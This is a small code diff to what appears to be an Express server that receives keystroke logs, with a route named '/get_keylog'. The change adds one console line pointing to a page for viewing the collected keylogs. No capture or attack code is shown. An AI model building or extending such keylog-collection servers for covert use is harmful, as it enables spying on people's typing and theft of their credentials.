@@ -37,4 +37,5 @@ app.get('/get_keylog', (req, res) => {
 
 app.listen(PORT, HOST, () => {
     console.log(`Server running on http://${HOST}:${PORT}`);
+    console.log(`View Keylogs on http://${HOST}:${PORT}/view`);
 });
